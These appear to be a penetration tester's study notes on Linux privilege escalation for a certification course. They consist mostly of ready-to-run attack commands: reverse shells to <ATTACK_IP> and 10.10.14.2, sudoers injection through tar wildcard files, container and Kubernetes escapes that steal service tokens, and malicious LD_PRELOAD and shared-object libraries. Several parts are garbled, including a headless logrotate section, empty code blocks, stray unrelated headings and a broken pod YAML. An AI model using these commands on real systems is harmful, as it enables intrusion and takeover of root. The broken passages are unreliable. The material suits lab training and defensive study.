# Linux Privilege Escalation — Explained Simply (full CPTS coverage)

> This is the **plain-English, expanded** version of my Linux PrivEsc notes. Same sections as my original, nothing skipped, but every part rewritten in easy words with **"when to use this / if it fails, try that"** logic added. Commands are single-line so they paste cleanly.

---

## The ONE idea behind ALL of this

Every single technique below is the **same move in a different costume**:

> **Find something that runs as root (or can act as root) that YOU are allowed to influence — then make it run your command.**

- A **binary** that runs as its root owner → SUID / SGID / Capabilities / Shared-object hijack
- A **command** sudo lets you run → Sudo abuse (GTFOBins)
- A **script or log** root runs on a timer → Cron / Logrotate
- A root script that calls a command **sloppily** → PATH / Wildcard abuse
- A root **service** with a known bug → Vulnerable services (Screen, Webmin, etc.)
- A **container** you can make mount the host → Docker / LXD / Kubernetes
- A **group** that reads root-only things → disk / adm / docker / lxd
- The **kernel** itself is old and buggy → Kernel / Dirty Pipe / Netfilter / PwnKit / Baron Samedit

You don't memorize 28 things. You run the checklist, see what pops, and open the one section that matches.

# Section 0 — The "security guards" (why an exploit sometimes fails)

Before blaming yourself, know that Linux has defenders that can silently block a technique. Recognizing them explains "why didn't this work?"

```
iptables / UFW → "Should I allow this network connection?"   (firewall)
AppArmor       → "Is this application allowed to do that?"    (per-app sandbox)
SELinux        → "Is this action allowed by policy?"          (system-wide policy)
Fail2ban       → "Is someone brute-forcing?"                  (ban on repeated fails)
Snort          → "Does this traffic look malicious?"          (IDS)
Exec Shield    → "Block this memory exploit?"                 (memory protection)
```

> If a reverse shell won't connect → suspect a **firewall** (try a common port like 443/53). If a binary refuses an action it "should" do → suspect **AppArmor/SELinux**. If you keep getting banned on logins → **Fail2ban**.

# Section 1 & 2 — Initial Enumeration

**Goal:** answer three questions — *who am I, what system is this, what can I touch?*

**Tools that automate everything:** `LinEnum`, `LinPEAS` (best), `linux-smart-enumeration (lse.sh)`. Run one early, then verify the interesting bits by hand.

## Basic "where am I" commands

| Command | What it tells you |
|---|---|
| `whoami` | current user |
| `id` | your UID, GID, **and groups** (groups are a privesc lever!) |
| `hostname` | machine name |
| `uname -a` | **kernel version** (decides kernel-exploit eligibility) |
| `cat /etc/os-release` | distro + version |
| `cat /etc/lsb-release` | distro (Ubuntu/Debian) |
| `lscpu` | CPU/arch (32 vs 64-bit matters for exploits) |
| `cat /etc/shells` | which shells exist |
| `screen -v` | Screen version (a known-vuln service, Section 12) |

> **Why `uname -a` matters so much:** half the "last resort" exploits (Dirty Pipe, Netfilter, PwnKit) are chosen *purely* by kernel version. Note it down first.

## Hidden & interesting files

Secrets love to hide in dotfiles.
```bash
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep <youruser>
```
```bash
find / -type d -name ".*" -ls 2>/dev/null
```
```bash
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

## Writable files & directories

Writable spots let you drop tools or hijack scripts. A writable dir where a **cron job** drops files is gold.
```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```
```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

## SUID / SGID (the classic)

These run with the **owner's** (SUID) or **group's** (SGID) privileges — often root.
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
```bash
find / -user root -perm -2000 -exec ls -ldb {} \; 2>/dev/null
```
```
SUID → runs as the file's OWNER   (look for -rwsr-xr-x — the first 's')
SGID → runs as the file's GROUP   (look for -rwxr-sr-x — the second 's')
```
> Finding one is **not** a win by itself. Check what it does, then look it up on **GTFOBins**. If it's a *custom* binary, read it / try shared-object hijack (Section 21).

# Section 2b — Using regex in grep (flag hunting)

Grep with a regex finds flags/secrets fast across the whole disk:
```bash
grep -RIlE 'HTB\{[^}]+\}' / 2>/dev/null
```
- `-R` recurse, `-I` skip binary files, `-l` print filenames, `-E` extended regex.
- `HTB\{[^}]+\}` = literally `HTB{...anything-not-a-brace...}`.

# Section 4 — Credential Hunting

When no obvious privesc exists, **go find a password or key** that gets you to another user (who may have the privesc).

| Command | What it finds |
|---|---|
| `grep -riE 'DB_USER\|DB_PASSWORD\|DB_PASS' /var/www 2>/dev/null` | DB creds in web app configs (WordPress `wp-config.php` etc.) |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null` | any config file |
| `ls -la ~/.ssh; cat ~/.ssh/known_hosts` | your keys + hosts you've connected to |
| `find / -type f \( -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" \) 2>/dev/null` | SSH private keys anywhere |
| `find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.xml" -o -name "*.bak" -o -name "*.txt" \) 2>/dev/null` | configs/backups/notes with creds |
| `grep -RiE "password\|passwd\|pwd\|username\|credential\|token" /var/www 2>/dev/null` | plaintext creds in the web root |
| `find /var/www -type f -name "wp-config.php" 2>/dev/null` | WordPress DB creds |
| `ls -la /var/mail /var/spool/mail 2>/dev/null` | mail that may leak info |

> **If you find a password → reuse it everywhere** (SSH, su to other users, DB). **If you find an SSH key →** `chmod 600 key; ssh -i key user@ip`. Password reuse across users/services is the #1 win here.
>
> **Extra move not in the original:** check `/etc/fstab`, backup files (`*.bak`, `*.old`, `*.tar.gz`), cron scripts, and database dumps — creds leak in all of them.

# Section 5 — PATH Abuse (PATH hijacking)

**When to use:** a root program/script runs a command **without its full path** (e.g. it runs `backup` instead of `/usr/bin/backup`). You trick Linux into running *your* version first.

**How PATH works:** `$PATH` is the list of folders Linux searches, **left to right**, when you type a command.
```bash
echo $PATH
```
If PATH is `/tmp:/usr/bin:/bin`, Linux checks `/tmp` first. So if a root script calls `backup` and you can put a fake `backup` in a folder that comes earlier in PATH, yours runs — as root.

Put the current dir first:
```bash
PATH=.:${PATH}
```
Find writable dirs already in PATH:
```bash
find $(echo $PATH | tr ':' ' ') -writable -type d 2>/dev/null
```

**Exploit:**
```bash
export PATH=.:$PATH
```
```bash
echo 'echo hi' > ls; chmod +x ls
```
```bash
ls
```
If your `./ls` runs, you've confirmed hijack. For real privesc, make the fake command a reverse shell or `cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash`, then trigger the root program.

> **If it fails:** the program probably uses absolute paths (good coding). Move on. **How to find candidates:** `strace` a SUID/root binary and watch `execve()` calls using bare command names.

# Section 6 — Wildcard Abuse

**When do I KNOW to try this?** The moment you see a `*` sitting as an argument *inside a root command*, in a folder you can write to. Run `cat /etc/crontab` and scan for a line like `... root ... tar -zcf backup.tar.gz *` or `rsync -a /var/www/* /backup/`.

> ⚠️ **Two kinds of `*` — don't mix them up.** The first five fields of a cron line (`*/5 * * * *`) are the **schedule** — ignore those, always there. The `*` you want is **inside the command itself** (`tar ... *`).

**3-question check (all must be YES):**
1. Does it run as **root**? (line shows `root`, or it's in `/etc/crontab` / `/etc/cron.d/`)
2. Does the command use **`*`**? (tar, rsync, chown, chmod, zip, 7z...)
3. Can I **write** to that folder? → `touch /that/folder/test && echo writable || echo no`

All YES → do the trick. Any NO (no `*`, explicit file list instead, or folder not writable) → skip it, move on.

**The secret:** *before the program runs*, the shell swaps the `*` for a list of the actual filenames in that folder. Example — if the folder has `a.txt` and `b.txt`, then `tar -zcf out.gz *` secretly becomes `tar -zcf out.gz a.txt b.txt`; the `*` is already gone before tar sees it. So if you create a file **named like an option** (e.g. a file literally called `--checkpoint=1`), the program receives that name as an **option**, not a filename — and runs it.

**Two kinds of files you create:**
- **Payload file** (`root.sh`) — holds the command you want root to run.
- **Trigger files** — empty files whose *names* are command options that make the program execute your payload. (Content doesn't matter; only the name does.)

Check cron:
```bash
cat /etc/crontab
```
Suppose you find:
```bash
cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```
**`tar` + `*` is the classic.** You create two empty files whose *names* are tar options. When tar expands `*`, it reads these names as instructions:
- **`--checkpoint=1`** → "pause after processing 1 file."
- **`--checkpoint-action=exec=sh root.sh`** → "at that pause, **run `sh root.sh`**."

Together they mean "after the first file, run my script." Since the cron job runs tar **as root**, your `root.sh` runs as root too.

```bash
cd /home/htb-student
```
```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```
```bash
echo "" > --checkpoint=1
```
```bash
echo "" > "--checkpoint-action=exec=sh root.sh"
```
```bash
ls -la
```
When root's cron runs `tar ... *`, the `*` includes your weird filenames, tar reads them as `--checkpoint` options, and runs `root.sh` as root. After it fires:
```bash
sudo -l
```
→ you now have full sudo.

> **Other wildcard-abusable commands:** `chown`, `chmod`, `rsync`, `7z`, `zip` (each has option-injection tricks on GTFOBins). **If it fails:** the cron may use an explicit file list instead of `*`, or you can't write to that folder.

# Section 7 — Escaping Restricted Shells

**When to use:** you log in and get a limited shell (`rbash`, `rksh`, `rzsh`) that blocks `cd`, `/`, redirects, etc.

See what commands you're even allowed:
```bash
compgen -c
```

**Escape tricks, try in order:**

Command injection via an allowed command's input:
```bash
ls -l `pwd`
```
Command substitution:
```bash
ls $(pwd)
```
Command chaining (if `;`, `&&`, `|` allowed):
```bash
ls; id
```
Change PATH (if env vars allowed):
```bash
export PATH=/bin:/usr/bin:$PATH
```
Shell functions (if allowed):
```bash
function test(){ id; }; test
```

Read a flag without escaping:
```bash
echo "$(<flag.txt)"
```
Cleanest escape — ask SSH to start bash directly (bypasses the restricted login shell):
```bash
ssh -t htb-user@IP bash
```
- `-t` gives a real terminal, `bash` overrides the restricted shell.

> **Other escapes:** if any of `vi`/`vim`, `man`, `less`, `awk`, `find`, `python`, `ed` are allowed → GTFOBins has a one-liner to spawn `/bin/sh` from inside them. That's usually the fastest route out.

# Section 8 — Special Permissions (SUID / SGID in depth)

**SUID** = runs as the file **owner** (often root). **SGID** = runs as the file **group**.

Find SUID:
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
Look for `-rwsr-xr-x` (first `s`).

Find SGID:
```bash
find / -uid 0 -perm -6000 -type f 2>/dev/null
```
Look for `-rwsr-sr-x` (second `s`).

**What to do with a hit:**
1. Is it a **standard binary** (`find`, `vim`, `nmap`, `cp`, `bash`, `env`...)? → **GTFOBins** has the exact SUID exploit.
2. Is it a **custom** binary (e.g. `/home/.../payroll`)? → read it, run `strings`/`ltrace` on it, check if it calls other commands (PATH abuse) or loads a writable `.so` (shared-object hijack, Section 21).

Example — SUID `apt-get` (from GTFOBins):
```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

> **Golden SUID one-liner** when `/bin/bash` is SUID: `/bin/bash -p` (the `-p` keeps root privileges). Many SUID escapes end in spawning `sh -p` or `bash -p`.
> **If it fails:** the binary may drop privileges internally, or have no exploitable feature — not every SUID is abusable.

# Section 9 — Sudo Rights Abuse

```bash
sudo -l
```
Look for lines like:
```
(root) NOPASSWD: /usr/sbin/tcpdump
```
`NOPASSWD` = run as root **without your password**.

**The method:** a sudo right isn't automatically root. Check whether the allowed program has a feature that runs another command. **GTFOBins is your lookup for every one of these.**

Example — `tcpdump` has `-z <cmd>` (run a command after rotating a capture):
```bash
cat /tmp/.test
```
Script (a reverse shell):
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACK_IP> 443 >/tmp/f
```
Listener:
```bash
nc -lnvp 443
```
Fire it:
```bash
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```
→ root reverse shell.

> **Workflow for ANY sudo entry:** copy the exact binary name → search it on **GTFOBins** → use its `sudo` section. Common instant wins: `vim`, `find`, `awk`, `less`, `man`, `nmap --interactive`, `python -c`, `env /bin/sh`, `busctl`, `ftp`, `perl`.
> **Watch for `(ALL, !root)` and `SETENV:`** — those unlock special tricks (Sections 22 & 23).
> **If GTFOBins has nothing:** check if the allowed command runs a script/binary **you can write** (edit the script), or if `LD_PRELOAD` is kept (Section 20).

# Sections 10, 14, 15 — Privileged Groups & Containers

First always:
```bash
id
```
Groups can hand you root without any exploit. Containers (OS-level isolation) can be escaped by mounting the host's `/`.

### Do I have this? → look at your groups in `id`

A group is a **direct lever** — no exploit, you just abuse the access the group already gives you:

| If `id` shows... | You can... | Go to |
|---|---|---|
| `docker` | run docker → mount host `/` → root | Docker below |
| `lxd` / `lxc` | make a privileged container → mount host `/` | LXD/LXC below |
| `disk` | read the raw disk with `debugfs` → read any file | disk below |
| `adm` | read every log in `/var/log` (creds leak there) | adm below |
| `sudo` / `wheel` | run commands as root → check `sudo -l` | Section 9 |
| `shadow` | read `/etc/shadow` → crack the hashes | — |

**Also ask: am I already INSIDE a container?**
```bash
ls -la /.dockerenv 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | grep -i docker
```
If yes → look for an escape: a mounted host folder (`mount | grep -v proc`) or a socket (`find / -name docker.sock 2>/dev/null`).

> **If `id` shows none of these special groups AND you're not in a container → skip this whole section.** That's how you know this doesn't apply.

## LXD / LXC

**When:** you're in the `lxc` or `lxd` group. You create a **privileged** container that mounts the host's `/`, then read root's files from inside it.

| Step | Privileged-Groups chapter | Container chapter | What it does |
|---|---|---|---|
| 1. Check group | `id` | `id` | are you in `lxc`/`lxd`? |
| 2. Check/init LXD | `lxd init` | `lxc info` | confirm LXD; init only if needed |
| 3. List images | `lxc image list` | `lxc image list` | is an image already there? |
| 4. Find a local image | `cd ContainerImages; ls` | `cd ContainerImages; ls` | e.g. `ubuntu-template.tar.xz` |
| 5. Import | `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine` | `lxc image import ubuntu-template.tar.xz --alias ubuntutemp` | load the image |
| 6. Confirm | `lxc image list` | `lxc image list` | it should appear |
| 7. Create privileged | `lxc init alpine r00t -c security.privileged=true` | `lxc init ubuntutemp privesc -c security.privileged=true` | weak isolation = key |
| 8. Mount host `/` | `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true` | `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true` | host `/` → `/mnt/root` |
| 9. Start | `lxc start r00t` | `lxc start privesc` | |
| 10. Enter | `lxc exec r00t /bin/sh` | `lxc exec privesc /bin/bash` | shell inside |
| 11. Check host FS | `ls -l /mnt/root` | `ls -l /mnt/root` | host files visible? |
| 12. Loot | `ls -l /mnt/root/root; ls -l /mnt/root/etc` | same | read host `/root`, `/etc` as root |

> **Core trick (same everywhere):** make a container and **mount host `/`** → you read/write host files as root. Grab `/mnt/root/root/.ssh/id_rsa` or edit `/mnt/root/etc/shadow`.

## Docker

- **Docker** packs an app + deps into a **container** (shares host OS, lighter than a VM).
- **Daemon** runs containers; you talk to it via the **socket** `docker.sock`.
- **Image** = blueprint; **container** = running instance.

**Core trick behind every Docker escape:** mount host `/` into a container you control (`-v /:/...`) → read host files as root.

**Option 1 — a host folder is mounted in the container:**
| # | Command | What |
|---|---|---|
| 1 | `ls -la /.dockerenv` | confirm you're in a container |
| 2 | `mount` or `cat /proc/mounts` | find bridged host folders (e.g. `/hostsystem`) |
| 3 | `ls -la /` | spot odd root dirs (`/hostsystem`, `/host`, `/backup`) |

# Section 11 — Capabilities

**What:** capabilities give a binary a *slice* of root power without full root. Dangerous if assigned to an abusable binary. Think of it as "this one program is allowed to do this one root-ish thing."

### Do I have this? → one command tells you

```bash
getcap -r / 2>/dev/null
```
- **Nothing printed, or only `cap_net_bind_service`** → not exploitable, **skip this section.**
- **A binary with a dangerous capability** → exploitable. The ones that matter:
  - `cap_setuid` on `python`/`perl`/`ruby` → become root directly.
  - `cap_dac_override` → read/edit **any file** (grab `/etc/shadow`, or blank root's password in `/etc/passwd`).
  - `cap_sys_module` → load a kernel module = instant root.
  - `cap_sys_admin` → broad admin powers.

> **How to exploit it:** take the binary name + its capability → look it up on **GTFOBins**, "Capabilities" section. It gives the exact one-liner. If the binary has no useful feature for that cap, it may not be abusable — but the 4 above almost always are.

Assign (how an admin sets one):
```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

**Dangerous capabilities to care about:**
| Capability | Meaning |
|---|---|
| `cap_setuid` | change process UID → become root |
| `cap_setgid` | change process GID |
| `cap_dac_override` | **bypass all file permission checks** |
| `cap_sys_admin` | broad admin (mount, etc.) |
| `cap_sys_ptrace` | attach to/inject other processes |
| `cap_sys_module` | load kernel modules → instant root |
| `cap_net_bind_service` | bind ports <1024 (usually harmless) |

**Values:** `+ep` = permitted+effective (active now). `+ei` = effective+inheritable. `+p` = permitted only (not active).

Find capabilities:
```bash
getcap -r / 2>/dev/null
```
```bash
getcap /usr/bin/vim.basic
```

**Example — `cap_dac_override` on vim** (bypass file perms, edit `/etc/passwd`):
```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```
```bash
su
```
(root's password field is now blank → `su` with no password = root.)

> **Quick wins by capability:** `cap_setuid` on `python`/`perl`/`ruby` → one-liner to `setuid(0)` and spawn a shell (GTFOBins "Capabilities" section). `cap_dac_override` → read/edit any file (grab `/etc/shadow` or add a root user). `cap_sys_module` → load a malicious kernel module.
> **Python+cap_setuid example:** `/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

# Section 16 — Kubernetes (K8s)

- **K8s** orchestrates many containers across machines. **Pod** = smallest unit (one+ containers, own IP).
- **Control Plane** = brain; **Worker Nodes** = run the pods.

### Do I have this? → is there a cluster, and is the Kubelet open?

**Signals a cluster is in play:**
- nmap/`ss` shows ports **6443, 10250, or 10255** open.
- The box has `kubectl`/`kubelet` installed, or `/var/run/secrets/kubernetes.io/` exists (= you're in a pod).

**Can I actually exploit it?** The weak spot is the **Kubelet (10250) allowing anonymous access.** Test it:
```bash
curl -sk https://TARGET:10250/pods | head
```
- Big JSON list of pods comes back → **exploitable** (anonymous Kubelet) → follow the steps below.
- Connection refused / `401` / `403` → locked down, this path is likely out.

**Key ports:**
| Service | Port | What |
|---|---|---|
| etcd | 2379/2380 | cluster-state database |
| **API server** | **6443** | main entry (use `kubectl`) |
| Scheduler | 10251 | places pods |
| Controller Mgr | 10252 | keeps desired state |
| **Kubelet API** | **10250** | per-node agent — **our target** |
| Read-only Kubelet | 10255 | read-only kubelet |

> **Remember:** `6443` = API server (boss). `10250` = Kubelet (often allows **anonymous** access = the weak spot).

**The whole attack in one line:** reach Kubelet (10250) → run commands in a pod → steal its token + ca.crt → check what you can do → if you can create pods, make an evil pod mounting host `/` → read host root's files.

**Step 1 — poke API server (403 = locked, normal):**
```bash
curl https://10.129.10.11:6443 -k
```
**Step 2 — list pods via Kubelet:**
```bash
curl https://10.129.10.11:10250/pods -k | jq .
```
**Step 3 — cleaner with kubeletctl:**
```bash
kubeletctl -i --server 10.129.10.11 pods
```
**Step 4 — find pods you can run commands in:**
```bash
kubeletctl -i --server 10.129.10.11 scan rce
```
(a `+` in the RCE column = exploitable)
**Step 5 — run a command in a pod:**
```bash
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```
**Step 6 — steal the service-account token:**
```bash
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```
**Step 7 — steal the CA cert:**
```bash
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```
**Step 8 — ask what that identity can do:**
```bash
export token=$(cat k8.token); kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```
(look for `pods → get create list` = you can make pods)
**Step 9 — evil pod that mounts host `/`** (`privesc.yaml`):
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt

  - name: mount-root-into-mnt
    hostPath:
      path: /

  hostNetwork: true
```
**Step 10 — create it & wait for Running:**
```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
```
```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
```

```bash
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

### Do I have this? → all 3 must be YES (any NO = skip)

```bash
find /var/log /tmp -writable -type f 2>/dev/null
```
```bash
ls -la /etc/cron.daily/logrotate
```
```bash

```
1. A log file **you can write** came back? and
2. logrotate is run by **root's cron** (the cron.daily file exists)? and
3. Version is a **vulnerable one** (3.8.6 / 3.11.0 / 3.15.0 / 3.18.0)?

All three YES → exploitable. Any one missing → move on.

**All 3 requirements must hold:**
| # | Requirement | Check |
|---|---|---|
| 1 | You can **write** a log file | `find /var/log /tmp -writable -type f 2>/dev/null` |
| 2 | logrotate runs as **root** | `ls -la /etc/cron.daily/logrotate` |

| File | What it tells you |
|---|---|
| `/etc/logrotate.conf` | global settings + `create`/`compress` mode |
| `/etc/logrotate.d/*` | per-service configs + which logs rotate (targets) |
| `/var/lib/logrotate.status` | when each log last rotated |

## Attack

**Step 1 — find a writable log + the mode:**
```bash
find /var/log /tmp -writable -type f 2>/dev/null
```
```bash
grep -E "create|compress" /etc/logrotate.conf | grep -v "#"
```
(mode: `create` = default; `compress` = add `-c` to the exploit)

**Step 2 — get & compile logrotten:**
```bash
git clone https://github.com/whotwagner/logrotten.git
```
```bash
cd logrotten && gcc logrotten.c -o logrotten
```
(can't download on target? `scp -r /path/logrotten user@target:/home/user/` then compile there.)

```bash
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

**Step 4 — listener:**

## 1. Passive traffic capture

## 2. Weak NFS privileges (no_root_squash)

**NFS** shares directories over the network (port **2049**). The dangerous option is **`no_root_squash`** — remote root stays root when creating files on the share, so you plant a **SUID root** binary.

**Do I have this?** → NFS port 2049 is open, and an export is set to `no_root_squash`:
```bash
showmount -e TARGET_IP
```
```bash
cat /etc/exports 2>/dev/null
```
See `no_root_squash` on a share → **exploitable** (you also need **root on your own attack box** to make the SUID file). No `no_root_squash` → skip.

| Step | Command | What |
|---|---|---|
| 1. Find exports | `showmount -e <TARGET_IP>` | directories the server shares |
| 2. Check config | `cat /etc/exports` | look for `no_root_squash` |
| 3. Make shell prog | (see below) | tiny setuid(0) bash launcher |
| 4. Compile | `gcc shell.c -o shell` | |
| 5. Mount share | `sudo mount -t nfs <TARGET_IP>:/tmp /mnt` | remote `/tmp` → local `/mnt` |
| 6. Copy binary | `cp shell /mnt` | |
| 7. Set SUID | `chmod u+s /mnt/shell` | you're root on your box, so it's owned root+SUID |
| 8. Run on target | `./shell` | from the target, in that shared dir |
| 9. Confirm | `id` | uid=0 |

Shell program:
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void){ setuid(0); setgid(0); system("/bin/bash"); }
```
| Option | Meaning |
|---|---|
| `root_squash` | remote root mapped to `nfsnobody` (safe) |
| `no_root_squash` | remote root **stays root** (dangerous) |

## 3. Hijacking tmux sessions

**Do I have this?** → there's a **root-owned tmux** session, its socket is **group-readable**, and `id` shows you're **in that group**. All three → attach and inherit root. Otherwise skip.

**When:** a **root tmux** session's socket is group-readable and you're in that group — attach to it and inherit root.

# Section 20 — Shared Libraries / LD_PRELOAD

**When:** `sudo -l` keeps `LD_PRELOAD` (`env_keep+=LD_PRELOAD`) AND you can run some binary as root with sudo. You make root load **your** library first.

### Do I have this? → one line in `sudo -l`
```bash
sudo -l
```
Look for **both**: the line `env_keep+=LD_PRELOAD`, **and** a command you're allowed to run as root. Both present → exploitable. No `LD_PRELOAD` in `env_keep` → skip (sudo strips it by default, so this only works when it's explicitly kept).

Check:
```bash
sudo -l
```
Look for `env_keep+=LD_PRELOAD` and e.g. `(root) NOPASSWD: /usr/sbin/apache2 restart`.

Malicious library `root.c`:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
```
Compile:
```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```
Run with sudo, preloading your lib (full path):
```bash
sudo LD_PRELOAD=/path/root.so /usr/sbin/apache2 restart
```
Because apache runs as root, your `_init()` runs as root → root shell. `id` to confirm.

> `unsetenv("LD_PRELOAD")` stops the variable leaking into child processes. **If it fails:** `LD_PRELOAD` isn't in `env_keep`, or the sudo command drops env — try `LD_LIBRARY_PATH` variants or another technique.

# Section 21 — Shared Object Hijacking

**When:** a **SUID root** binary loads a `.so` library from a directory **you can write to**. Replace the library → your code runs as root.

### Do I have this? → a SUID binary + a writable library folder
Usually a **custom** SUID binary (not a standard one like `passwd`). Two signs together = exploitable:
1. `ldd <binary>` shows a library loaded from an **unusual path** (e.g. `/development/`), and
2. that folder is **writable by you** (`ls -la /development/`), or `readelf -d <binary> | grep PATH` shows a writable **RUNPATH**.

The automation script below finds exactly these in one go. If every library a SUID binary loads comes from a root-only dir (`/lib`, `/usr/lib`) → not exploitable this way, skip.

**1. Find SUID binaries:**
```bash
find / -user root -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```
**2. Check its libraries:**
```bash
ldd /path/payroll
```
(look for a custom one, e.g. `libshared.so => /development/libshared.so`)
**3. Check RUNPATH + writability:**
```bash
readelf -d /path/payroll | grep PATH
```
```bash
ls -la /development/
```
If `/development` is writable → you can plant your `.so`.

**Automate 1–3** (only shows SUID binaries that load libs from writable dirs):
```bash
find / -user root -perm -4000 -type f 2>/dev/null | while read bin; do while read lib; do dir=$(dirname "$lib"); if [ -w "$dir" ]; then echo "SUID: $bin | writable libdir: $dir | lib: $lib"; readelf -d "$bin" 2>/dev/null | grep -E 'RPATH|RUNPATH'; fi; done < <(ldd "$bin" 2>/dev/null | awk '/=> \// {print $3}'); done
```

**4. Find which function it needs** (temporarily copy a real lib so it tells you the missing symbol):
```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```
```bash
./payroll
```
Error `undefined symbol: dbquery` → it needs a `dbquery()` function.
**5. Write your library `src.c`:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void dbquery() { printf("Malicious library loaded\n"); setuid(0); system("/bin/sh -p"); }
```
**6. Compile to the expected path:**
```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```
**7. Run the SUID binary:**
```bash
./payroll
```
```bash
id
```
→ uid=0.

# Section 22 — Python Library Hijacking

**Idea:** a Python script you can run **as root** (sudo/SUID) does `import <module>`. If you control what gets imported, your code runs as root. **You attack the module, not the script.**

### Do I have this? → `sudo -l` points at a python script
```bash
sudo -l
```
See something like `(root) NOPASSWD: /usr/bin/python3 /path/script.py` → exploitable *if* you can control a module it imports. Then: read the script (which module + function?), and check the 3 vectors + the script's own folder (below). If none of those is writable → not exploitable. No python script in `sudo -l` → skip.

**3 vectors:**
| # | Vector | Misconfig | You win when |
|---|---|---|---|
| 1 | Insecure write perms | the module `.py` is writable by you | edit the real module |
| 2 | Library search path | a **higher-priority** search dir is writable | drop a fake module there |
| 3 | PYTHONPATH env | sudo rule has `SETENV:` | point PYTHONPATH at your dir |

**Methodology (every time):**
1. `sudo -l` → find a python script you can run as root (or a `SETENV:` rule).
2. Read the script → note the **module** imported and **function** called.
3. `pip3 show <module>` → its install path.
4. Pick the vector by what you can write.
5. Inject payload into the hijacked function (**same name + same arguments**).
6. Run with sudo → test with `id`, then swap a reverse shell in.

**Worked example:** `mem_status.py` imports `psutil`, calls `virtual_memory()`.
```bash
sudo -l
```
`(ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py`
```bash
pip3 show psutil
```

**Option 1 — module file writable:**
```bash
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```
If it has `w` for others, edit the top of `virtual_memory()`:
```python
def virtual_memory():
    import os; os.system('id')
    ...
```
```bash
sudo /usr/bin/python3 ./mem_status.py
```

**Option 2 — a higher-priority search dir is writable:**
```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```
If a dir **above** psutil's real location is writable, drop a fake `psutil.py` (same name + function):
```bash
echo 'import os
def virtual_memory():
    os.system("id")' > /usr/lib/python3.8/psutil.py
```
```bash
sudo /usr/bin/python3 mem_status.py
```
(a traceback after `id` is fine — your code already ran)

**Option 3 — SETENV in sudo:**
```bash
sudo -l
```
`(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3`
```bash
echo 'import os
def virtual_memory():
    os.system("id")' > /tmp/psutil.py
```
```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ~/mem_status.py
```

**The real lab answer (when all 3 "fail"):** Python **also checks the script's own folder first**. So drop your fake module next to the script:
```bash
python3 -c 'import sys; print(sys.path)'
```
Position 0 of `sys.path` is **always the script's directory**. Drop `psutil.py` there:
```bash
echo 'import os
def virtual_memory():
    os.system("cat /root/flag.txt")' > /home/htb-student/psutil.py
```
```bash
sudo /usr/bin/python3 /home/htb-student/mem_status.py
```
→ Python finds YOUR psutil first.

**Mental checklist:** `sudo -l` → read script + its import → try file-writable? higher-path-writable? SETENV? → **if all fail, write to the script's own directory.**

# Section 23 — Sudo (version CVEs)

### Do I have this? → check the sudo version
```bash
sudo -V | head -n1
```
- **Baron Samedit (CVE-2021-3156):** vulnerable if version is old (e.g. 1.8.31, 1.8.27, 1.9.2 and many below the patch) — works for **any** local user, no sudo rights needed. Needs `gcc`/`make` to compile.
- **CVE-2019-14287 (`-u#-1`):** only if version is **< 1.8.28** AND `sudo -l` shows a rule like `(ALL, !root) /some/command`.

Patched/newer sudo, or (for the `-u#-1` bug) no `(ALL,!root)` rule → skip.

See the rules:
```bash
sudo cat /etc/sudoers 2>/dev/null | grep -v "#" | sed -r '/^\s*$/d'
```

## Attack 1 — CVE-2021-3156 "Baron Samedit" (heap overflow)

